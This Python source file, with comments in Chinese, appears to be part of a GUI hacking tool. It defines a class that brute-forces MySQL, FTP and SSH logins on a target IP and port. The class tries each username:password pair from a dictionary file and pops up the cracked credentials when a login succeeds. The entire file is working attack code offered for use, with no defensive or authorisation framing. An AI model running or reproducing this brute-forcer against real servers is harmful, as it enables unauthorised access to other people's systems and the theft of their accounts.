# coding:utf-8
import pymysql
from ftplib import FTP
import paramiko
from tkinter import messagebox

class Brute:
    PORT_DIC = {
        3306: 'mysql',
        21: 'ftp',
        22: 'ssh'
    }

    def __init__(self, window, brute_type, var_dropdown):
        self.window = window
        self.brute_type = brute_type
        self.var_dropdown = var_dropdown

    def solve(self):



        window = self.window
        brute_type = self.brute_type
        dic_path = self.var_dropdown.get()

        ip, port_number = window.title().split(':')[0], int(window.title().split(':')[1].split('的')[0])
        tag = f'{ip}:{port_number}'
        solver = {
            'mysql': self.mysql_brute,
            'ftp': self.ftp_brute,
            'ssh': self.ssh_brute
        }[brute_type]

        # 读取字典文件到dic_list
        try:
            dic_list = []
            with open(dic_path, 'r') as f:
                for line in f:
                    user, password = line.strip().split(':')
                    dic_list.append((user, password))
        except:
            messagebox.showerror('错误', '字典文件读取失败请检查文件后重试')
            return

        for user, password in dic_list:
            if solver(ip, port_number, user, password):
                messagebox.showinfo(f'{tag}爆破成功', f'用户名：{user}，密码：{password}')
                break
        else:
            messagebox.showerror(f'{tag}爆破失败', '请检查字典文件或者尝试其他爆破方式')

    # 一个字典爆破mysql密码的函数
    @staticmethod
    def mysql_brute(ip, port, user, password):
        try:
            conn = pymysql.connect(host=ip, port=port, user=user, passwd=password)
            conn.close()
            return True
        except Exception as e:
            return False

    # 一个字典爆破ftp密码的函数
    @staticmethod
    def ftp_brute(ip, port, user, password):
        try:
            ftp = FTP()
            ftp.connect(ip, port)
            ftp.login(user, password)
            ftp.close()
            return True
        except Exception as e:
            return False

    # 一个字典爆破ssh密码的函数
    @staticmethod
    def ssh_brute(ip, port, user, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port, user, password)
            ssh.close()
            return True
        except Exception as e:
            return False